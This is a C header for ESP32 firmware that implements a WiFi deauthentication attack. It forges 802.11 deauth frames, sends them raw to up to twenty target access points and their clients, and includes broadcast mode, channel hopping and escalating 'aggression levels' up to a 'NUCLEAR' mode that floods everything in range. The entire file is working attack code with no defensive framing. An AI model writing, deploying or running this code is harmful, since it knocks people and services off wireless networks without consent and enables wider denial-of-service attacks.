
#ifndef WIFI_DEAUTH_ENHANCED_H
#define WIFI_DEAUTH_ENHANCED_H

#include <stdint.h>
#include <string.h>
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#define MAX_DEAUTH_TARGETS 20

static const char *DEAUTH_TAG = "WiFi_Deauth";
static uint8_t deauth_running = 0;
static TaskHandle_t deauth_task_handle = NULL;

typedef struct {
    uint8_t bssid[6];
    uint8_t channel;
    char ssid[33];
    uint8_t active;
} DeauthTarget;

typedef struct {
    uint8_t frame_ctrl[2];
    uint8_t duration[2];
    uint8_t destination[6];
    uint8_t source[6];
    uint8_t bssid[6];
    uint8_t seq_ctrl[2];
    uint8_t reason[2];
} __attribute__((packed)) deauth_frame_t;

// Aggression levels
typedef enum {
    DEAUTH_LEVEL_SINGLE = 0,    // Single target, 1 packet per second
    DEAUTH_LEVEL_MULTI = 1,     // Multiple targets, 5 packets per second per target
    DEAUTH_LEVEL_AGGRESSIVE = 2, // All targets, 20 packets per second, channel hop
    DEAUTH_LEVEL_NUCLEAR = 3    // Everything in range, 100+ packets/sec, all channels
} DeauthLevel;

typedef struct {
    DeauthLevel level;
    uint16_t packets_per_burst;
    uint16_t burst_interval;     // ms between bursts
    uint8_t channel_hop;         // Enable channel hopping
    uint8_t broadcast_mode;      // Deauth broadcast (all clients)
    uint8_t reason_code;         // Deauth reason
} DeauthConfig;

static DeauthTarget deauth_targets[MAX_DEAUTH_TARGETS];
static uint8_t deauth_target_count = 0;
static DeauthConfig deauth_config;
static uint32_t total_packets_sent = 0;

// Initialize with default config
static inline void deauth_init_config(void) {
    deauth_config.level = DEAUTH_LEVEL_SINGLE;
    deauth_config.packets_per_burst = 5;
    deauth_config.burst_interval = 100;
    deauth_config.channel_hop = 0;
    deauth_config.broadcast_mode = 1;
    deauth_config.reason_code = 0x07; // Class 3 frame from nonassociated STA
}

// Apply preset based on level
static inline void deauth_set_level(DeauthLevel level) {
    deauth_config.level = level;
    
    switch (level) {
        case DEAUTH_LEVEL_SINGLE:
            deauth_config.packets_per_burst = 5;
            deauth_config.burst_interval = 1000;
            deauth_config.channel_hop = 0;
            deauth_config.broadcast_mode = 1;
            ESP_LOGI(DEAUTH_TAG, "Level: SINGLE - Focused attack");
            break;
            
        case DEAUTH_LEVEL_MULTI:
            deauth_config.packets_per_burst = 10;
            deauth_config.burst_interval = 200;
            deauth_config.channel_hop = 0;
            deauth_config.broadcast_mode = 1;
            ESP_LOGI(DEAUTH_TAG, "Level: MULTI - Multiple targets");
            break;
            
        case DEAUTH_LEVEL_AGGRESSIVE:
            deauth_config.packets_per_burst = 20;
            deauth_config.burst_interval = 50;
            deauth_config.channel_hop = 1;
            deauth_config.broadcast_mode = 1;
            ESP_LOGI(DEAUTH_TAG, "Level: AGGRESSIVE - Channel hopping enabled");
            break;
            
        case DEAUTH_LEVEL_NUCLEAR:
            deauth_config.packets_per_burst = 50;
            deauth_config.burst_interval = 10;
            deauth_config.channel_hop = 1;
            deauth_config.broadcast_mode = 1;
            ESP_LOGI(DEAUTH_TAG, "Level: NUCLEAR - Maximum chaos");
            break;
    }
}

// Send deauth frame
static void send_deauth(uint8_t *bssid, uint8_t *client) {
    deauth_frame_t deauth = {0};
    
    deauth.frame_ctrl[0] = 0xC0; // Type: Management, Subtype: Deauth
    deauth.frame_ctrl[1] = 0x00;
    
    deauth.duration[0] = 0x00;
    deauth.duration[1] = 0x00;
    
    memcpy(deauth.destination, client, 6);
    memcpy(deauth.source, bssid, 6);
    memcpy(deauth.bssid, bssid, 6);
    
    static uint16_t seq_num = 0;
    deauth.seq_ctrl[0] = (seq_num & 0x0F) << 4;
    deauth.seq_ctrl[1] = (seq_num & 0x0FF0) >> 4;
    seq_num++;
    
    deauth.reason[0] = deauth_config.reason_code;
    deauth.reason[1] = 0x00;
    
    esp_wifi_80211_tx(WIFI_IF_AP, &deauth, sizeof(deauth_frame_t), false);
    total_packets_sent++;
}

// Deauth task with channel hopping
static void deauth_task(void *param) {
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint8_t current_channel = 1;
    uint32_t last_stats = 0;
    
    ESP_LOGI(DEAUTH_TAG, "Deauth started - Level %d, %d targets", 
             deauth_config.level, deauth_target_count);
    ESP_LOGI(DEAUTH_TAG, "Config: %d packets/burst, %dms interval, channel_hop=%d",
             deauth_config.packets_per_burst, deauth_config.burst_interval,
             deauth_config.channel_hop);
    
    while (deauth_running) {
        // Channel hopping for aggressive modes
        if (deauth_config.channel_hop) {
            esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);
            current_channel = (current_channel % 13) + 1; // Cycle 1-13
        }
        
        // Attack all active targets
        for (uint8_t i = 0; i < deauth_target_count; i++) {
            if (!deauth_targets[i].active) continue;
            
            // Set to target's channel if not hopping
            if (!deauth_config.channel_hop) {
                esp_wifi_set_channel(deauth_targets[i].channel, WIFI_SECOND_CHAN_NONE);
            }
            
            // Send burst of deauth packets
            for (uint16_t j = 0; j < deauth_config.packets_per_burst; j++) {
                if (deauth_config.broadcast_mode) {
                    // Deauth broadcast - kicks all clients
                    send_deauth(deauth_targets[i].bssid, broadcast);
                }
                // Also send from broadcast to AP (both directions)
                send_deauth(broadcast, deauth_targets[i].bssid);
                
                // Small delay between packets in nuclear mode
                if (deauth_config.level == DEAUTH_LEVEL_NUCLEAR) {
                    vTaskDelay(pdMS_TO_TICKS(1));
                }
            }
        }
        
        // Stats every 5 seconds
        uint32_t now = xTaskGetTickCount() * portTICK_PERIOD_MS;
        if (now - last_stats > 5000) {
            ESP_LOGI(DEAUTH_TAG, "📊 Packets sent: %lu", total_packets_sent);
            last_stats = now;
        }
        
        vTaskDelay(pdMS_TO_TICKS(deauth_config.burst_interval));
    }
    
    ESP_LOGI(DEAUTH_TAG, "Deauth stopped - Total packets: %lu", total_packets_sent);
    deauth_task_handle = NULL;
    vTaskDelete(NULL);
}

// Add target
static inline uint8_t deauth_add_target(uint8_t *bssid, uint8_t channel, const char *ssid) {
    if (deauth_target_count >= MAX_DEAUTH_TARGETS) return 0;
    
    memcpy(deauth_targets[deauth_target_count].bssid, bssid, 6);
    deauth_targets[deauth_target_count].channel = channel;
    strncpy(deauth_targets[deauth_target_count].ssid, ssid, 32);
    deauth_targets[deauth_target_count].ssid[32] = '\0';
    deauth_targets[deauth_target_count].active = 1;
    deauth_target_count++;
    
    ESP_LOGI(DEAUTH_TAG, "Added target: %s (ch %d)", ssid, channel);
    return 1;
}

// Clear targets
static inline void deauth_clear_targets(void) {
    deauth_target_count = 0;
    memset(deauth_targets, 0, sizeof(deauth_targets));
}

// Start deauth
static inline uint8_t deauth_start(void) {
    if (deauth_running) return 0;
    if (deauth_target_count == 0) return 0;
    
    static uint8_t wifi_init = 0;
    if (!wifi_init) {
        esp_err_t err;
        err = esp_netif_init();
        if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) ESP_ERROR_CHECK(err);
        
        err = esp_event_loop_create_default();
        if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) ESP_ERROR_CHECK(err);
        
        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
        ESP_ERROR_CHECK(esp_wifi_init(&cfg));
        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
        ESP_ERROR_CHECK(esp_wifi_start());
        wifi_init = 1;
    }
    
    total_packets_sent = 0;
    deauth_running = 1;
    
    BaseType_t result = xTaskCreate(deauth_task, "deauth_task", 4096, NULL, 5, &deauth_task_handle);
    if (result != pdPASS) {
        deauth_running = 0;
        return 0;
    }
    
    return 1;
}

// Stop deauth
static inline void deauth_stop(void) {
    if (!deauth_running) return;
    deauth_running = 0;
    uint8_t wait = 0;
    while (deauth_task_handle != NULL && wait++ < 50) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }
}

// Get stats
static inline uint32_t deauth_get_packet_count(void) {
    return total_packets_sent;
}

static inline uint8_t deauth_get_target_count(void) {
    return deauth_target_count;
}

static inline DeauthTarget* deauth_get_target(uint8_t index) {
    if (index >= deauth_target_count) return NULL;
    return &deauth_targets[index];
}

static inline DeauthConfig* deauth_get_config(void) {
    return &deauth_config;
}

static inline uint8_t deauth_is_running(void) {
    return deauth_running;
}

static inline const char* deauth_get_level_name(DeauthLevel level) {
    switch (level) {
        case DEAUTH_LEVEL_SINGLE: return "Single";
        case DEAUTH_LEVEL_MULTI: return "Multi";
        case DEAUTH_LEVEL_AGGRESSIVE: return "Aggressive";
        case DEAUTH_LEVEL_NUCLEAR: return "Nuclear";
        default: return "Unknown";
    }
}

#endif
